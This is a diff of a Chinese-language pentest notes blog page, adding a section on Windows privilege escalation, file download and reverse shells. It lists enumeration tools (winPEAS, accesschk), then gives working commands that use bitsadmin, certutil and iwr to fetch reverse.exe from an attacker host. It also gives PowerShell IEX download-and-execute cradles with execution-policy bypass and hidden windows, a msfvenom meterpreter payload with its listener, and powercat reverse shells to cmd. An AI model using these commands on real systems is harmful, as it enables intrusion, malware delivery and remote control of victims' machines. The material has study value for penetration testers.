@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.7k</span>
+            <span class="post-count">2.8k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">6 分钟</span>
+            <span class="post-count">11 分钟</span>
         </span>
     </span>
 </div>
@@ -139,6 +139,47 @@
 <h2 id="2-1-2提权方式"><a href="#2-1-2提权方式" class="headerlink" title="2.1.2提权方式"></a>2.1.2提权方式</h2><p>一般通过找对应版本的exp，去进行利用</p>
 <p>利用cs工具，监听成功后，去用插件提权</p>
 <p>msf</p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>winPEAS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</span><br><span class="line">WinPEAS 是一个脚本，用于枚举目标系统以发现权限升级路径。</span><br></pre></td></tr></table></figure>
+
+<p>accesschk</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">accesschk是微软提供的一款安全检查工具，是Sysintenals集合中的一款工具，作为确保他们创建安全环境Windows管理员通常需要知道特定用户或组对资源（包括文件、目录、注册表项、全局对象和Windows服务）拥有哪些类型的访问权限。</span><br><span class="line">accesschk.exe /accepteula( /accepteula一定要加上去，否则会自动弹出一个是否接收许可协议)</span><br><span class="line">-q          忽略banner</span><br><span class="line">-u          忽略错误</span><br><span class="line">-v          详细信息</span><br><span class="line">-w          只显示拥有可写权的对象</span><br><span class="line">accesschk.exe /accepteula -uvwqk &quot;路径可以根据WinPEAS返回结果填写&quot;</span><br></pre></td></tr></table></figure>
+
+<p>系统内核溢出漏洞，而没有打相应补丁</p>
+<h2 id="2-1-3-windows下载文件和加载木马"><a href="#2-1-3-windows下载文件和加载木马" class="headerlink" title="2.1.3 windows下载文件和加载木马"></a>2.1.3 windows下载文件和加载木马</h2><h3 id="windows下cmd窗口文件下载"><a href="#windows下cmd窗口文件下载" class="headerlink" title="windows下cmd窗口文件下载"></a>windows下cmd窗口文件下载</h3><h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>bitsadmin 可以用来在windows 命令行下下载文件。bitsadmin是windows 后台智能传输服务的一个工具，windows 的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。</p>
+<p>bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。</p>
+<p>bitsadmin 可以跟随URL跳转.</p>
+<p>bitsadmin 不像curl wget 这类工具那样能用来下载HTML页面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe c:\users\staccato\desktop\reverse.exe</span><br><span class="line"># &quot;任务名&quot; 可以随意起，保存文件的文件路径必须是已经存在的目录，否则不能下载。</span><br><span class="line"></span><br><span class="line">#默认情况下bitsadmin下载速度极慢，下载较大文件需要设置优先级提速</span><br><span class="line">start bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe  f:\reverse.exe</span><br><span class="line">bitsadmin /setpriority test foreground     #设置任务test为最高优先级</span><br></pre></td></tr></table></figure>
+
+<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>一款下载文件的工具，自从WindowsServer 2003就自带。但是在Server 2003使用会有问题。也就是说，以下命令是在Win7及其以后的机器使用。但是该命令的使用会引发杀毒软件的查杀，所以在实际渗透中几乎不适用该命令.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe #下载文件到当前目录下</span><br><span class="line">certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe  c:/users/staccato/desktop/reserver.exe        #下载文件到指定目录下</span><br></pre></td></tr></table></figure>
+
+<h4 id="iwr"><a href="#iwr" class="headerlink" title="iwr"></a>iwr</h4><p>PowerShell下的一款工具，所以我们如果在cmd下执行该命令的话，需要在前面加powershell命令，但是这会被安全软件检测到。所以在执行前，先进入powershell下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwr -Uri http://www.test.com/vps.exe -OutFile vps.exe -UseBasicParsing</span><br></pre></td></tr></table></figure>
+
+<h3 id="Window下加载执行PowerShell脚本"><a href="#Window下加载执行PowerShell脚本" class="headerlink" title="Window下加载执行PowerShell脚本"></a>Window下加载执行PowerShell脚本</h3><h4 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h4><p>在cmd当前目录下有PowerView.ps1脚本，并执行其中的Get-Netdomain模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass Import-Module .\powerview.ps1;Get-NetDomain</span><br></pre></td></tr></table></figure>
+
+<h4 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h4><p>远程下载并执行test.ps1脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://xx.xx.xx.xx/test.ps1&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>远程下载PowerView.ps1脚本，并执行其中的Get-Netdomain模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://xx.xx.xx.xx/powerview.ps1&#x27;);import-module .\powerview.ps1;Get-NetDomain</span><br></pre></td></tr></table></figure>
+
+<h3 id="windows反弹shell"><a href="#windows反弹shell" class="headerlink" title="windows反弹shell"></a>windows反弹shell</h3><h4 id="cmd反弹msf-shell"><a href="#cmd反弹msf-shell" class="headerlink" title="cmd反弹msf shell"></a>cmd反弹msf shell</h4><p>首先在vps上操作</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.6.54.194 lport=7788 -f psh-reflection -o 7788.ps1        #生成木马文件 7788.ps1</span><br><span class="line">python -m SimpleHTTPServer 80  #开启web服务</span><br><span class="line">#MSF监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.6.54.194</span><br><span class="line">set lport 7788</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#目标机器上操作</span><br><span class="line">powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&quot;  #后台运行</span><br><span class="line">或者</span><br><span class="line">powershell -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&#x27;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="cmd窗口下利用Powershell反弹NC-shell"><a href="#cmd窗口下利用Powershell反弹NC-shell" class="headerlink" title="cmd窗口下利用Powershell反弹NC shell"></a><strong>cmd窗口下利用Powershell反弹NC shell</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 10.6.54.194 -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object System.Net.Webclient)DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 10.6.54.194  -p 8888 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="cmd窗口下利用Powershell反弹cs-shell"><a href="#cmd窗口下利用Powershell反弹cs-shell" class="headerlink" title="cmd窗口下利用Powershell反弹cs shell"></a>cmd窗口下利用Powershell反弹cs shell</h4><p>注: windows10 经常性不能用。windows 2008R2以下百分百适用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.6.54.194:8080/a&#x27;))&quot;   #后台运行</span><br><span class="line"></span><br><span class="line">powershell.exe  -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.6.54.194:8080/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>工具和文件下载部分，参考先知社区<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12588">断*奏</a></p>
 <h1 id="2-2Mysql提权"><a href="#2-2Mysql提权" class="headerlink" title="2.2Mysql提权"></a>2.2Mysql提权</h1><h2 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h2><p>拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；</p>
 <p>尝试udf提权，其实质就是<code>以MySQL的身份执行系统命令</code></p>
 <h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>1.secure_file_priv为空，有导入导出权限</p>
